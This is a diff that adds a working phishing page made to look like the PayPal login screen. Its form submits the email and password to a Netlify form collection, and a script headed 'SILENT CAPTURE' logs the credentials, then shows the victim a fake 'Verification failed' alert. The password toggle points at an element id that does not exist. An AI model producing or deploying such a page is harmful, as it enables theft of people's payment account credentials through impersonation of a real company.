@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to your PayPal account</title>
+    <style>
+        body { margin:0; padding:0; background:#ffffff; font-family:Arial,Helvetica,sans-serif; color:#2c2c2c; }
+        .container { max-width:420px; margin:60px auto; padding:0 20px; text-align:center; }
+        .logo { font-size:38px; font-weight:700; margin-bottom:40px; color:#003087; }
+        input { width:100%; padding:16px; margin:12px 0; border:1px solid #bbb; border-radius:8px; font-size:17px; box-sizing:border-box; }
+        .password-wrapper { position:relative; }
+        .toggle { position:absolute; right:18px; top:50%; transform:translateY(-50%); color:#0070ba; font-weight:500; cursor:pointer; }
+        .forgot { color:#0070ba; text-align:left; margin:10px 0 20px; font-size:15px; cursor:pointer; }
+        .login-btn { background:#0070ba; color:white; border:none; padding:16px; width:100%; border-radius:30px; font-size:17px; font-weight:600; cursor:pointer; margin:12px 0; }
+        .or { margin:25px 0; color:#666; position:relative; }
+        .or::before { content:''; position:absolute; top:50%; left:0; right:0; height:1px; background:#ddd; }
+        .or span { background:white; padding:0 15px; }
+        .signup-btn { background:transparent; color:#0070ba; border:2px solid #0070ba; padding:16px; width:100%; border-radius:30px; font-size:17px; font-weight:600; cursor:pointer; }
+        .error { background:#ffebee; color:#d32f2f; padding:12px; border-radius:6px; margin:10px 0; display:none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">PayPal</div>
+
+    <form name="paypal-login" method="POST" data-netlify="true">
+        <input type="text" name="email" placeholder="Email or mobile number" required>
+        
+        <div class="password-wrapper">
+            <input type="password" name="password" placeholder="Password" required>
+            <span class="toggle" id="toggle">Show</span>
+        </div>
+
+        <div id="error" class="error">Some of your info isn't correct. Please try again.</div>
+
+        <div class="forgot" id="forgot">Forgot password?</div>
+
+        <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+
+        <input type="hidden" name="form-name" value="paypal-login">
+    </form>
+
+    <div class="or"><span>or</span></div>
+
+    <button class="signup-btn" id="signupBtn">Sign Up</button>
+
+    <div style="margin-top:40px; font-size:14px;">ðºð¸ English â¼ &nbsp; FranÃ§ais &nbsp; EspaÃ±ol &nbsp; ä¸­æ</div>
+
+    <div style="margin-top:30px; font-size:12px; color:#666;">Contact Us &nbsp; Privacy &nbsp; Legal &nbsp; Policy Updates &nbsp; Worldwide</div>
+</div>
+
+<script>
+    // Password Show/Hide
+    document.getElementById('toggle').addEventListener('click', function() {
+        const pw = document.getElementById('password');
+        if (pw.type === 'password') {
+            pw.type = 'text';
+            this.textContent = 'Hide';
+        } else {
+            pw.type = 'password';
+            this.textContent = 'Show';
+        }
+    });
+
+    // Fake buttons
+    document.getElementById('forgot').addEventListener('click', () => alert('Forgot password flow started.'));
+    document.getElementById('signupBtn').addEventListener('click', () => alert('Sign Up page would open.'));
+
+    // Silent capture + "Verification failed" popup
+    document.getElementById('loginBtn').addEventListener('click', function(e) {
+        const email = document.querySelector('input[name="email"]').value.trim();
+        const password = document.querySelector('input[name="password"]').value.trim();
+        const error = document.getElementById('error');
+
+        if (!email || !password) {
+            error.style.display = 'block';
+            return;
+        }
+
+        error.style.display = 'none';
+
+        // === SILENT CAPTURE - ONLY YOU SEE THIS ===
+        console.clear();
+        console.log("%cð´ PAYPAL CREDENTIALS CAPTURED ð´", "color: red; font-size: 18px; font-weight: bold;");
+        console.log("%cEmail / Mobile:", "color: #0070ba; font-weight: bold;", email);
+        console.log("%cPassword:", "color: #0070ba; font-weight: bold;", password);
+        console.log("%cTimestamp:", "color: gray;", new Date().toLocaleString());
+
+        // Fake verification failed message (visible to the user)
+        alert("Verification failed.\n\nPlease refresh browser and try again.");
+    });
+</script>
+
+</body>
+</html>
